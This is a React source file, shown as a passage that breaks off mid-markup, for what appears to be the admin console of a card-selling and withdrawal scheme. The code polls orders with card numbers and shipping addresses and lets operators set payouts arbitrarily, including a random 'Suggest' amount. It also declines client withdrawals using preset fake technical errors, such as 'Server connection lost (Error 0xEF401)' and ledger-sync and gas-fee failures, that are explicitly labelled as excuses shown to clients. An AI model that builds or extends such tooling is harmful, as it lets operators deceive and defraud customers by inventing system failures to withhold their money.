import React, { useState, useEffect, useRef } from "react";
import { RESERVED_DROP_ASSETS, CardAsset } from "../data/cards";
import { 
  ShieldAlert, 
  User, 
  CreditCard, 
  MapPin, 
  ChevronRight, 
  Clock, 
  CheckCircle2, 
  XSquare, 
  RefreshCw,
  Trash2,
  Lock,
  MessageSquare,
  Search,
  Bell,
  BellRing,
  Volume2
} from "lucide-react";

interface AdminConsoleProps {
  onResetComplete?: () => void;
}

// Low-overhead synth double chime for transaction alerts
function playNotificationSound() {
  try {
    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContextClass) return;
    const audioCtx = new AudioContextClass();
    
    const playTone = (freq: number, start: number, duration: number) => {
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, start);
      
      gain.gain.setValueAtTime(0.06, start);
      gain.gain.exponentialRampToValueAtTime(0.0001, start + duration);
      
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      
      osc.start(start);
      osc.stop(start + duration);
    };
    
    const now = audioCtx.currentTime;
    playTone(587.33, now, 0.45); // D5
    playTone(880.00, now + 0.12, 0.60); // A5
  } catch (err) {
    console.warn("[AUDIO SYNTH] Context could not play yet due to browser user-gesture restrictions.");
  }
}

export default function AdminConsole({ onResetComplete }: AdminConsoleProps) {
  const [dbData, setDbData] = useState<any>({ cards: [], purchases: [], withdrawals: [] });
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [customExcuse, setCustomExcuse] = useState<Record<string, string>>({});
  const [selectedExcusePreset, setSelectedExcusePreset] = useState<Record<string, string>>({});
  const [approvedBalances, setApprovedBalances] = useState<Record<string, string>>({});

  // Real-time purchase alert lists state
  const [notifications, setNotifications] = useState<any[]>(() => {
    try {
      const cached = localStorage.getItem("local_admin_notifications");
      return cached ? JSON.parse(cached) : [];
    } catch (e) {
      return [];
    }
  });

  // Track temporary active notification toasts for slide-in HUD animations
  const [toasts, setToasts] = useState<any[]>([]);

  const excusePresets = [
    { value: "Server connection lost (Error 0xEF401)", label: "Server Connection Lost" },
    { value: "Cryptographic hand-shake failure: Connection refused by mainnet pool.", label: "Handshake Failure" },
    { value: "Blockchain ledger nodes out of synchronization. Retry after epoch cycle.", label: "Ledger Out-of-Sync" },
    { value: "Sovereign gateway restricted under temporary security overreach protocols.", label: "Security Overreach" },
    { value: "Insufficient network Gas fees coverage parameter. Gas reserve locked.", label: "Insufficient Gas Cover" }
  ];

  const [secondsToRefresh, setSecondsToRefresh] = useState(45);
  
  const knownPurchaseIdsRef = useRef<Set<string>>(new Set());
  const isFirstLoadRef = useRef(true);

  // Persistence write for notifications
  useEffect(() => {
    localStorage.setItem("local_admin_notifications", JSON.stringify(notifications));
  }, [notifications]);

  // Dedicated background polling of order records matching purchase alerts every 3 seconds
  useEffect(() => {
    // Populate known purchases initially so we don't spam toasts on simple page load
    if (dbData.purchases && dbData.purchases.length > 0) {
      dbData.purchases.forEach((p: any) => {
        if (p.id) knownPurchaseIdsRef.current.add(p.id);
      });
      isFirstLoadRef.current = false;
    }
  }, [dbData.purchases]);

  useEffect(() => {
    let silentInterval: NodeJS.Timeout;

    const checkNewPurchasesSilently = async () => {
      try {
        const res = await fetch("/api/admin/data");
        if (!res.ok) return;
        const apiData = await res.json();
        if (apiData && Array.isArray(apiData.purchases)) {
          const newOrdersDetected: any[] = [];
          
          apiData.purchases.forEach((p: any) => {
            if (p.id && !knownPurchaseIdsRef.current.has(p.id)) {
              knownPurchaseIdsRef.current.add(p.id);
              if (!isFirstLoadRef.current) {
                newOrdersDetected.push(p);
              }
            }
          });

          if (isFirstLoadRef.current) {
            isFirstLoadRef.current = false;
          } else if (newOrdersDetected.length > 0) {
            playNotificationSound();

            newOrdersDetected.forEach((item) => {
              const orderAmount = item.config?.customPrice ? `$${item.config.customPrice}.00` : "$20.00";
              const label = `${item.shippingDetails?.fullName || item.config?.cardHolder || 'Anonymous Peer'}`;
              
              const newNotif = {
                id: item.id || `notif-${Date.now()}-${Math.random()}`,
                message: `Incoming credit order verified for ${label}`,
                amount: orderAmount,
                cardNumber: item.config?.cardNumber || "Unknown",
                cardHolder: item.config?.cardHolder || "Anonymous Peer",
                shippingName: item.shippingDetails?.fullName || "Anonymous Peer",
                orderedAt: item.orderedAt || new Date().toLocaleDateString(),
                timestamp: Date.now(),
                read: false
              };

              // Prepend to persistent notifications lists
              setNotifications(prev => [newNotif, ...prev]);

              // Push temporary slide toaster
              const id = Math.random();
              setToasts(prev => [...prev, { id, ...newNotif }]);
              setTimeout(() => {
                setToasts(prev => prev.filter(t => t.id !== id));
              }, 6000);
            });

            // Update state silently so list refreshes right away
            setDbData(apiData);
          }
        }
      } catch (e) {
        // Fail silently
      }
    };

    silentInterval = setInterval(checkNewPurchasesSilently, 3000);
    return () => clearInterval(silentInterval);
  }, []);

  const triggerDemoAlert = () => {
    playNotificationSound();
    const demoCardNum = `4${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)}`;
    const randomNames = ["John Doe", "Anya Chalotra", "Mark Zuckerberg", "Satoshi Nakamoto", "Vitalik Buterin"];
    const randomHolder = randomNames[Math.floor(Math.random() * randomNames.length)];
    const randomCities = ["London", "New York", "Tokyo", "Berlin", "Silicon Valley"];
    const randomCity = randomCities[Math.floor(Math.random() * randomCities.length)];

    const fakeOrder = {
      id: `fake-ord-${Date.now()}`,
      message: `Incoming credit order verified for ${randomHolder}`,
      amount: `$${(20 + Math.floor(Math.random() * 8) * 10)}.00`,
      cardNumber: demoCardNum,
      cardHolder: randomHolder.toUpperCase(),
      shippingName: randomHolder,
      orderedAt: new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" }),
      timestamp: Date.now(),
      read: false
    };

    setNotifications(prev => [fakeOrder, ...prev]);

    const toasterId = Math.random();
    setToasts(prev => [...prev, { id: toasterId, ...fakeOrder }]);
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== toasterId));
    }, 6000);
  };

  const markAllNotificationsRead = () => {
    setNotifications(prev => prev.map(n => ({ ...n, read: true })));
  };

  const clearAllNotifications = () => {
    setNotifications([]);
  };

  const deleteNotification = (id: string) => {
    setNotifications(prev => prev.filter(n => n.id !== id));
  };

  const fetchAdminData = async () => {
    let apiData = null;
    try {
      setLoading(true);
      const res = await fetch("/api/admin/data");
      if (res.ok) {
        apiData = await res.json();
      }
    } catch (e: any) {
      console.warn("[ADMIN PORTAL] Server api offline, reading native local storage registers.");
    }

    if (apiData) {
      setDbData(apiData);
      setError("");
    } else {
      // Offline / Serverless client fallback
      const cachedCards = localStorage.getItem('local_cards_catalog');
      const cachedWts = localStorage.getItem('local_withdrawals');
      const clientOrders = localStorage.getItem('unknown_orders');

      let cards = RESERVED_DROP_ASSETS;
      let purchases = [];
      let withdrawals = [];

      if (cachedCards) {
        try { cards = JSON.parse(cachedCards); } catch(e){}
      }
      if (clientOrders) {
        try { purchases = JSON.parse(clientOrders); } catch(e){}
      }
      if (cachedWts) {
        try { withdrawals = JSON.parse(cachedWts); } catch(e){}
      }

      setDbData({
        cards,
        purchases,
        withdrawals
      });
      setError("");
    }
    setLoading(false);
  };

  const handleManualRefresh = async () => {
    setSecondsToRefresh(45);
    await fetchAdminData();
  };

  useEffect(() => {
    fetchAdminData();
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setSecondsToRefresh((prev) => {
        if (prev <= 1) {
          fetchAdminData();
          return 45;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const handleAction = async (withdrawalId: string, action: "approve" | "decline") => {
    const excuse = action === "decline" 
      ? (customExcuse[withdrawalId] || selectedExcusePreset[withdrawalId] || excusePresets[0].value)
      : undefined;

    const assignedAmount = action === "approve"
      ? parseFloat(approvedBalances[withdrawalId] || "3420")
      : undefined;

    try {
      await fetch("/api/admin/action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ withdrawalId, action, excuse, amount: assignedAmount })
      });
    } catch (e: any) {
      console.warn("[ADMIN STATUS SYNC] Server offline, updating client-side cache directly.");
    }

    // Always keep browser local cache in exact sync for the client
    const savedWtsStr = localStorage.getItem('local_withdrawals');
    if (savedWtsStr) {
      try {
        const savedWts = JSON.parse(savedWtsStr);
        const updated = savedWts.map((w: any) => {
          if (w.id === withdrawalId) {
            return {
              ...w,
              status: action === "approve" ? "approved" : "declined",
              excuse: excuse || null,
              amount: action === "approve" ? (assignedAmount !== undefined ? assignedAmount : w.amount) : w.amount,
              etaTarget: action === "approve" ? Date.now() : w.etaTarget // Clear timer if approved
            };
          }
          return w;
        });
        localStorage.setItem('local_withdrawals', JSON.stringify(updated));
      } catch (err) {
        console.error("Failed to sync cache withdrawal status:", err);
      }
    }
    
    // Instantly renew data
    await fetchAdminData();
  };

  const handleToggleSold = async (cardNumber: string, currentSold: boolean) => {
    const nextSold = !currentSold;
    try {
      await fetch("/api/admin/toggle-sold", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cardNumber, isSold: nextSold })
      });
    } catch (e) {
      console.warn("[ADMIN COMPONENT] Server offline or toggle endpoint timed out, running on storage registers fallback.");
    }

    // Keep persistent offline mode fully simulated in browser Storage
    const cachedCards = localStorage.getItem('local_cards_catalog');
    let currentCards = RESERVED_DROP_ASSETS;
    if (cachedCards) {
      try { currentCards = JSON.parse(cachedCards); } catch (e) {}
    }

    const updated = currentCards.map((c: CardAsset) => {
      const cardNumClean = cardNumber.replace(/\s+/g, "");
      const targetNumClean = (c.cardNumber || "").replace(/\s+/g, "");
      if (cardNumClean === targetNumClean) {
        return {
          ...c,
          isSold: nextSold,
          soldBalance: nextSold ? (c.soldBalance || "$20.00") : undefined,
          balanceStatus: nextSold ? "COURIER DISPATCHED" : "ON-CHAIN POOL DIRECT"
        };
      }
      return c;
    });

    localStorage.setItem('local_cards_catalog', JSON.stringify(updated));

    // Refresh telemetry immediately
    await fetchAdminData();
  };

  const handleReset = async () => {
    if (!window.confirm("CRITICAL WARNING: Are you sure you want to completely erase the card purchases, registered withdrawals, and restore default droplists?")) {
      return;
    }

    // Reset local cache completely
    localStorage.removeItem('local_cards_catalog');
    localStorage.removeItem('local_purchases');
    localStorage.removeItem('local_withdrawals');
    localStorage.removeItem('unknown_orders');
    localStorage.removeItem('unknown_cart');

    try {
      await fetch("/api/admin/reset", { method: "POST" });
    } catch (e: any) {
      console.warn("[ADMIN STATE fallback] Server offline during database reset.");
    }

    alert("Sovereign Ledger reset to default matrix status.");
    if (onResetComplete) onResetComplete();
    await fetchAdminData();
  };

  const formatTimer = (secs: number) => {
    if (secs <= 0) return "TIME ELAPSED";
    const h = Math.floor(secs / 3600);
    const m = Math.floor((secs % 3600) / 60);
    const s = secs % 60;
    return `${h.toString().padStart(2, '0')}h ${m.toString().padStart(2, '0')}m ${s.toString().padStart(2, '0')}s`;
  };

  const filteredPurchases = dbData.purchases.filter((p: any) => {
    const cardNum = p.config?.cardNumber || "";
    const holder = p.config?.cardHolder || "";
    const name = p.shippingDetails?.fullName || "";
    const term = searchTerm.toLowerCase();
    return cardNum.toLowerCase().includes(term) || holder.toLowerCase().includes(term) || name.toLowerCase().includes(term);
  });

  return (
    <div className="space-y-8 text-left animate-fade-in relative" id="admin-telemetry-portal">
      
      {/* FLOATING ACTION TOAST NOTIFICATIONS (AUTO-DISMISS) */}
      <div className="fixed bottom-6 right-6 z-50 flex flex-col gap-3.5 max-w-md w-full pointer-events-none px-4 sm:px-0">
        {toasts.map((toast) => (
          <div
            key={toast.id}
            className="pointer-events-auto bg-black/95 border-2 border-[#d4af37] text-zinc-100 p-4.5 rounded-xl shadow-[0_0_25px_rgba(212,175,55,0.15)] flex flex-col gap-2.5 font-mono text-[11px] animate-slide-in relative overflow-hidden"
          >
            {/* Glowing yellow bar */}
            <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-yellow-500 to-amber-600 animate-pulse" />
            
            <div className="flex items-center justify-between pb-1.5 border-b border-zinc-900">
              <span className="text-[#d4af37] font-extrabold flex items-center gap-1.5 uppercase text-[9px] tracking-widest animate-pulse">
                <BellRing className="w-3.5 h-3.5 text-yellow-500 shrink-0" />
                Live Purchase Register
              </span>
              <span className="text-[8.5px] text-emerald-400 font-black font-mono">
                {toast.amount}
              </span>
            </div>

            <div className="space-y-1">
              <p className="text-zinc-200 font-black leading-tight">
                {toast.message}
              </p>
              <div className="grid grid-cols-2 gap-1.5 text-[9px] text-zinc-500 font-mono mt-1 pt-1 border-t border-zinc-950">
                <div>
                  <span className="text-zinc-650 block uppercase text-[7.5px]">Specimen Block:</span>
                  <span className="text-[#d4af37] font-semibold block">{toast.cardNumber}</span>
                </div>
                <div>
                  <span className="text-zinc-650 block uppercase text-[7.5px]">Shipping City:</span>
                  <span className="text-zinc-300 font-semibold block uppercase">CIPHER SHIPPED</span>
                </div>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setToasts((prev) => prev.filter((t) => t.id !== toast.id))}
              className="absolute top-2 right-2.5 text-zinc-600 hover:text-zinc-100 font-bold transition-all text-[9.5px] cursor-pointer"
            >
              ✕
            </button>
          </div>
        ))}
      </div>

      {/* HEADER SECTION */}
      <div className="flex flex-col md:flex-row items-start md:items-center justify-between border border-zinc-900 bg-neutral-950/60 rounded-xl p-5 gap-4">
        <div className="flex items-start gap-3">
          <div className="w-10 h-10 rounded-lg bg-red-950/30 border border-red-900/40 flex items-center justify-center text-red-400 shrink-0">
            <ShieldAlert className="w-5 h-5 animate-pulse" />
          </div>
          <div>
            <span className="text-[10px] text-[#d4af37] font-bold uppercase tracking-widest font-mono block">
              // SOVEREIGN SECURITY HUB
            </span>
            <h2 className="text-zinc-100 text-sm font-semibold tracking-wider font-mono uppercase font-black">
              Decentralized Administrator Console
            </h2>
            <p className="text-zinc-500 text-[10px]">
              Review live client credit transactions, full card metrics, and control verification dispatch queues.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3 w-full md:w-auto self-stretch md:self-auto justify-end">
          <button
            type="button"
            onClick={triggerDemoAlert}
            className="flex items-center gap-1.5 text-yellow-400 hover:text-black hover:bg-yellow-500 bg-zinc-950/40 border-2 border-dashed border-yellow-500/30 py-1.5 px-3 rounded font-mono uppercase text-[9px] tracking-wider transition-all font-extrabold cursor-pointer"
            title="Inject simulated client checkout purchase order to preview alerts"
          >
            <BellRing className="w-3.5 h-3.5 shrink-0" /> Simulation Purchase Trigger
          </button>

          <button
            type="button"
            onClick={handleManualRefresh}
            className="flex items-center gap-1.5 text-zinc-400 hover:text-white bg-zinc-950 border border-zinc-850 py-2 px-3 rounded font-mono uppercase text-[9px] tracking-wider transition-all cursor-pointer"
          >
            <RefreshCw className={`w-3 h-3 ${loading ? 'animate-spin' : ''}`} /> Refresh telemetry ({secondsToRefresh}s)
          </button>
          
          <button
            type="button"
            onClick={handleReset}
            className="flex items-center gap-1.5 text-red-400 hover:text-white hover:bg-red-950/50 bg-zinc-950 border border-red-900/40 py-2 px-3.5 rounded font-mono uppercase text-[9px] tracking-wider font-bold cursor-pointer"
          >
            <Trash2 className="w-3 h-3" /> Reset Ledger Pool
          </button>
        </div>
      </div>

      {/* SECTION: REAL-TIME TRANSACTION ALERT TELEMETRY DRAWER */}
      <div className="border border-zinc-900/80 bg-[#d4af37]/2 rounded-xl p-4.5 space-y-4" id="admin-purchase-alerts-dashboard">
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-zinc-900 pb-3">
          <div className="flex items-center gap-2.5">
            <div className="relative">
              <Bell className="w-4 h-4 text-[#d4af37]" />
              {notifications.some(n => !n.read) && (
                <span className="absolute -top-1.5 -right-1.5 w-2 h-2 bg-red-500 rounded-full animate-ping" />
              )}
            </div>
            <div>
              <span className="text-[10px] text-zinc-400 font-bold tracking-widest block font-mono uppercase">
                📢 Real-Time Order Dispatch Alerts (Auto-Polling Live)
              </span>
              <span className="text-[9px] text-[#d4af37] font-mono leading-tight block">
                Detected through client checkout hooks // Chime synthesized on-chain
              </span>
            </div>
          </div>

          <div className="flex items-center gap-2 self-stretch sm:self-auto justify-end">
            <button
              type="button"
              disabled={notifications.length === 0}
              onClick={markAllNotificationsRead}
              className="text-[9px] border border-zinc-850 hover:bg-neutral-900 text-zinc-400 disabled:opacity-40 py-1 px-2.5 rounded font-mono uppercase tracking-wider font-bold cursor-pointer"
            >
              Mark All Read
            </button>
            <button
              type="button"
              disabled={notifications.length === 0}
              onClick={clearAllNotifications}
              className="text-[9px] border border-red-950 bg-red-950/5 text-red-400 hover:bg-red-950/30 disabled:opacity-40 py-1 px-2.5 rounded font-mono uppercase tracking-wider font-bold cursor-pointer"
            >
              Clear Log
            </button>
          </div>
        </div>

        {notifications.length === 0 ? (
          <div className="py-6 text-center text-zinc-550 font-mono text-[9.5px] space-y-1">
            <p>● MONITORING STREAM SECURELY // NO NEW CHECKOUT EVENT BROADCASTS DETECTED</p>
            <p className="text-zinc-650 text-[8.5px]">To view beautiful animations right now, click "Simulation Purchase Trigger" inside the Header controls above.</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 max-h-[195px] overflow-y-auto pr-1">
            {notifications.map((notif) => (
              <div
                key={notif.id}
                className={`border rounded-xl p-3 flex items-start gap-3 relative transition-all ${
                  notif.read
                    ? "border-zinc-950 bg-zinc-950/10 text-zinc-450"
                    : "border-yellow-600/30 bg-yellow-950/5 text-zinc-200"
                }`}
              >
                {!notif.read && (
                  <div className="absolute top-3 right-3 flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 bg-yellow-500 rounded-full animate-pulse" />
                    <span className="text-[7.5px] text-[#d4af37] font-black uppercase font-mono tracking-widest">
                      NEW TRANSACTION
                    </span>
                  </div>
                )}
                
                <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${
                  notif.read ? "bg-zinc-900 border border-zinc-850 text-zinc-500" : "bg-[#d4af37]/10 border border-[#d4af37]/35 text-[#d4af37]"
                }`}>
                  <CreditCard className="w-4 h-4" />
                </div>

                <div className="space-y-1 text-left w-full pr-14 select-text">
                  <div className="flex items-center gap-1.5 font-mono">
                    <span className="text-[9px] font-bold text-zinc-400 uppercase truncate max-w-[130px]" title={notif.shippingName}>
                      {notif.shippingName}
                    </span>
                    <span className="text-zinc-600 text-[8px]">//</span>
                    <span className="text-[8px] text-zinc-500 font-extrabold">{notif.orderedAt}</span>
                  </div>
                  <p className="text-[10px] font-black leading-tight text-zinc-300 font-mono">
                    {notif.message}
                  </p>
                  <p className="text-[8.5px] font-mono text-zinc-500">
                    Card Specs Index: <code className="text-[#d4af37] font-bold font-mono">{notif.cardNumber}</code>
                  </p>
                </div>

                <div className="absolute bottom-2.5 right-3 flex items-center gap-2">
                  <span className="text-[9.5px] font-bold text-emerald-400 font-mono pr-1">
                    {notif.amount}
                  </span>
                  <button
                    type="button"
                    onClick={() => deleteNotification(notif.id)}
                    className="text-zinc-650 hover:text-red-400 text-[10px] transition-colors font-bold uppercase block px-1 cursor-pointer"
                    title="Delete log entry"
                  >
                    ✕
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {loading && dbData.purchases.length === 0 ? (
        <div className="py-20 text-center text-zinc-500 font-mono text-xs animate-pulse">
          INTERSECTING CENTRAL DB METRICS SYSTEM...
        </div>
      ) : error ? (
        <div className="border border-red-900/40 bg-red-950/10 p-5 rounded-lg text-xs font-mono text-red-400 gap-1 flex flex-col">
          <span className="font-black">// ERROR PARSING SYSTEM FEED:</span>
          <span>{error}</span>
        </div>
      ) : (
        <div className="grid grid-cols-1 gap-8">
          
          {/* SECTION 1: WITHDRAWALS REQUEST MATRIX CONTROL */}
          <div className="space-y-4">
            <div className="border-b border-zinc-900 pb-2.5 flex items-center justify-between">
              <span className="text-[10px] text-zinc-400 font-bold tracking-widest block font-mono uppercase flex items-center gap-2">
                <Clock className="w-3.5 h-3.5 text-yellow-500 animate-spin" /> Live Withdrawal Queue ({dbData.withdrawals.length} active)
              </span>
              <span className="text-[9px] text-zinc-650 font-mono font-bold uppercase">48-Hr Verification Limit</span>
            </div>

            {dbData.withdrawals.length === 0 ? (
              <div className="border border-zinc-900 bg-neutral-950/20 rounded-xl p-10 text-center font-mono">
                <h4 className="text-zinc-500 text-[10px] uppercase font-bold tracking-wider">No Active Withdrawal Requests</h4>
                <p className="text-zinc-650 text-[10px] mt-1">Client withdrawals initiated inside the Decryption Portal will stream here in real time.</p>
              </div>
            ) : (
              <div className="space-y-4 font-mono">
                {dbData.withdrawals.map((wt: any) => {
                  const now = Date.now();
                  const secsRemaining = Math.max(0, Math.floor((new Date(wt.etaTarget).getTime() - now) / 1005));

                  return (
                    <div 
                      key={wt.id}
                      className={`border rounded-xl p-5 hover:border-zinc-750 transition-colors bg-black/40 ${
                        wt.status === "pending" 
                          ? "border-yellow-600/30" 
                          : wt.status === "approved" 
                          ? "border-emerald-900/40" 
                          : "border-red-950/40 text-zinc-500"
                      }`}
                    >
                      <div className="flex flex-col lg:flex-row justify-between gap-4">
                        
                        {/* Withdraw Meta details */}
                        <div className="space-y-3 flex-grow text-xs">
                          <div className="flex flex-wrap items-center gap-2">
                            <span className="text-[9.5px] font-black uppercase text-[#d4af37] px-2 py-0.5 bg-yellow-500/10 border border-yellow-500/20 rounded">
                              {wt.method.toUpperCase()} WITHDRAWAL
                            </span>
                            <span className="text-zinc-500 text-[9px]">{wt.id}</span>
                            
                            {/* Current Real Status indicators */}
                            {wt.status === "pending" && (
                              <span className="text-[8.5px] bg-yellow-400/10 text-yellow-500 border border-yellow-500/20 py-0.5 px-2 rounded font-bold animate-pulse">
                                ● PENDING VERIFICATION
                              </span>
                            )}
                            {wt.status === "approved" && (
                              <span className="text-[8.5px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 py-0.5 px-2 rounded font-bold">
                                ✓ APPROVED & RELEASED
                              </span>
                            )}
                            {wt.status === "declined" && (
                              <span className="text-[8.5px] bg-red-950/20 text-red-400 border border-red-900/30 py-0.5 px-2 rounded font-bold">
                                ✗ DECLINED & LOCKED
                              </span>
                            )}
                          </div>

                          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-3.5 pt-1.5 text-[11px]">
                            <div>
                              <span className="text-zinc-500 block text-[9px] uppercase">Client card:</span>
                              <span className="text-zinc-250 font-bold">{wt.cardHolder}</span>
                              <span className="text-zinc-500 block text-[10px] font-light">{wt.cardNumber}</span>
                            </div>
                            <div>
                              <span className="text-zinc-500 block text-[9px] uppercase">Target Pay Address:</span>
                              <span className="text-zinc-300 font-bold select-all overflow-hidden truncate block max-w-[200px]" title={wt.account}>
                                {wt.account}
                              </span>
                            </div>
                            <div>
                              <span className="text-zinc-500 block text-[9px] uppercase">Withdrawal Cash Out:</span>
                              {wt.status === "pending" ? (
                                <div className="space-y-0.5">
                                  <span className="text-yellow-500 text-[10px] font-bold font-mono block animate-pulse">
                                    [ AWAITING VALUE ]
                                  </span>
                                  <span className="text-[8px] text-zinc-550">Decided by Admin Pre-Decision</span>
                                </div>
                              ) : (
                                <span className="text-emerald-400 text-xs font-semibold font-mono block">
                                  ${(wt.amount || 0).toLocaleString()}.00 USD
                                </span>
                              )}
                            </div>
                          </div>

                          {/* DYNAMIC LINKED PURCHASE NODE */}
                          {(() => {
                            const cleanCardNumber = (wt.cardNumber || "").replace(/\s+/g, "");
                            const matchedPurchase = (dbData.purchases || []).find((pur: any) => {
                              const cleanPurCard = (pur.config?.cardNumber || "").replace(/\s+/g, "");
                              return cleanPurCard === cleanCardNumber;
                            });

                            if (matchedPurchase) {
                              return (
                                <div className="mt-3.5 p-3.5 bg-emerald-950/10 border border-emerald-900/30 rounded-xl text-[10px] text-zinc-300">
                                  <div className="flex items-center gap-1.5 text-emerald-400 font-bold uppercase text-[8.5px] mb-1.5">
                                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                                    <span>Match Verified: Linked Purchase Order Found</span>
                                  </div>
                                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 font-mono leading-tight">
                                    <div>
                                      <span className="text-zinc-500 block text-[8px] uppercase">Ordered Date:</span>
                                      <span className="text-zinc-200 font-bold block">ORD-#{matchedPurchase.id.slice(4, 12).toUpperCase()}</span>
                                      <span className="text-zinc-400 block text-[9px] mt-0.5">{matchedPurchase.orderedAt}</span>
                                    </div>
                                    <div>
                                      <span className="text-zinc-500 block text-[8px] uppercase">Shipping Destination Address:</span>
                                      <span className="text-zinc-200 font-bold block">{matchedPurchase.shippingDetails?.fullName}</span>
                                      <span className="text-zinc-400 block text-[9px] truncate max-w-[280px]" title={`${matchedPurchase.shippingDetails?.address}, ${matchedPurchase.shippingDetails?.city}`}>
                                        {matchedPurchase.shippingDetails?.address}, {matchedPurchase.shippingDetails?.city}
                                      </span>
                                    </div>
                                  </div>
                                </div>
                              );
                            } else {
                              return (
                                <div className="mt-3.5 p-3.5 bg-neutral-950/40 border border-zinc-900 rounded-xl text-[10px] text-zinc-500 text-left">
                                  <div className="flex items-center gap-1.5 text-zinc-500 font-bold uppercase text-[8.5px] mb-1">
                                    <ShieldAlert className="w-3.5 h-3.5 shrink-0" />
                                    <span>Independent Specimen Card (Manual Parameter Run)</span>
                                  </div>
                                  <p className="font-mono text-[9px] leading-tight text-zinc-500">
                                    No direct e-shop order matching card number <code className="text-[#d4af37] font-bold">{wt.cardNumber}</code> found in database. Client running custom parameters or raw card checks.
                                  </p>
                                </div>
                              );
                            }
                          })()}

                          {/* 48hr countdown dynamic status */}
                          <div className="flex flex-wrap items-center gap-2 pt-1 border-t border-zinc-900/60 mt-2 text-[10.5px]">
                            <div className="flex items-center gap-1.5 text-zinc-500">
                              <Clock className="w-3.5 h-3.5 text-zinc-500" />
                              <span className="text-[9px] uppercase">48-Hr Persistent Queue Countdown:</span>
                            </div>
                            <span className={`font-semibold ${secsRemaining > 0 ? 'text-zinc-200 animate-pulse' : 'text-zinc-500'}`}>
                              {formatTimer(secsRemaining)}
                            </span>
                          </div>

                          {wt.status === "declined" && wt.excuse && (
                            <div className="bg-red-950/15 border border-red-900/20 p-2.5 rounded text-[10.5px] text-red-400 block max-w-2xl font-mono mt-2">
                              <span className="font-bold uppercase text-[9px] block text-red-500/90 mb-0.5">Dispatched Excuse Message shown to Client:</span>
                              <q className="italic">{wt.excuse}</q>
                            </div>
                          )}
                        </div>

                        {/* Withdraw Control Actions */}
                        {wt.status === "pending" && (
                          <div className="shrink-0 flex flex-col justify-end gap-3 min-w-[260px] border-l border-zinc-900/60 pl-0 lg:pl-5 self-center w-full lg:w-auto">
                            
                            {/* CHOOSE APPROVED BALANCE PRE-DECISION */}
                            <div className="space-y-1 text-left">
                              <label className="text-[8.5px] text-[#d4af37] block font-bold uppercase tracking-wider">
                                Decide Payout Balance (USD) *
                              </label>
                              <div className="relative">
                                <span className="absolute left-2.5 top-1 text-zinc-500 font-bold font-mono text-[10px]">$</span>
                                <input
                                  type="number"
                                  required
                                  placeholder="Enter balance, e.g. 3450"
                                  value={approvedBalances[wt.id] !== undefined ? approvedBalances[wt.id] : ""}
                                  onChange={(e) => {
                                    setApprovedBalances({
                                      ...approvedBalances,
                                      [wt.id]: e.target.value
                                    });
                                  }}
                                  className="w-full bg-zinc-950 border border-yellow-600/30 text-emerald-400 text-[10.5px] font-mono py-1 pl-5.5 pr-14 rounded outline-none focus:border-[#d4af37] font-black"
                                />
                                <button
                                  type="button"
                                  onClick={() => {
                                    // Lazily generate suggested amount, typically between $1,800 and $4,950
                                    const suggested = 1800 + (Math.floor(Math.random() * 30) * 95);
                                    setApprovedBalances({
                                      ...approvedBalances,
                                      [wt.id]: suggested.toString()
                                    });
                                  }}
                                  className="absolute right-1 top-1 text-[7.5px] bg-zinc-900 text-[#d4af37] border border-zinc-800 px-1.5 py-0.5 rounded uppercase font-bold text-center cursor-pointer"
                                >
                                  Suggest
                                </button>
                              </div>
                            </div>

                            {/* PRESES EXCUSES OR TEXT */}
                            <div className="space-y-1 text-left">
                              <label className="text-[8.5px] text-zinc-550 block font-bold uppercase tracking-wider">
                                Excuse preset fallback (for Decline)
                              </label>
                              <select
                                value={selectedExcusePreset[wt.id] || ""}
                                onChange={(e) => {
                                  setSelectedExcusePreset({
                                    ...selectedExcusePreset,
                                    [wt.id]: e.target.value
                                  });
                                  // Clear manual custom excuse to avoid conflicts
                                  setCustomExcuse({ ...customExcuse, [wt.id]: "" });
                                }}
                                className="w-full bg-zinc-950 border border-zinc-900 text-zinc-400 text-[10px] font-mono p-1 rounded outline-none focus:border-zinc-850"
                              >
                                {excusePresets.map((preset) => (
                                  <option key={preset.value} value={preset.value}>
                                    {preset.label}
                                  </option>
                                ))}
                              </select>
                            </div>

                            {/* TEXT BOX CUSTOM EXCUSE */}
                            <div className="space-y-1 text-left">
                              <input
                                type="text"
                                placeholder="Or enter manual custom excuse..."
                                value={customExcuse[wt.id] || ""}
                                onChange={(e) => setCustomExcuse({ ...customExcuse, [wt.id]: e.target.value })}
                                className="w-full bg-zinc-950 border border-zinc-900 text-zinc-300 text-[9.5px] font-mono py-1 px-2 rounded outline-none focus:border-[#d4af37]"
                              />
                            </div>

                            <div className="grid grid-cols-2 gap-2 text-[10px]">
                              <button
                                type="button"
                                onClick={() => handleAction(wt.id, "decline")}
                                className="w-full py-2 border border-red-900 hover:bg-red-900/25 text-red-400 hover:text-white rounded transition-colors uppercase font-bold cursor-pointer"
                              >
                                Decline Excuse
                              </button>
                              
                              <button
                                type="button"
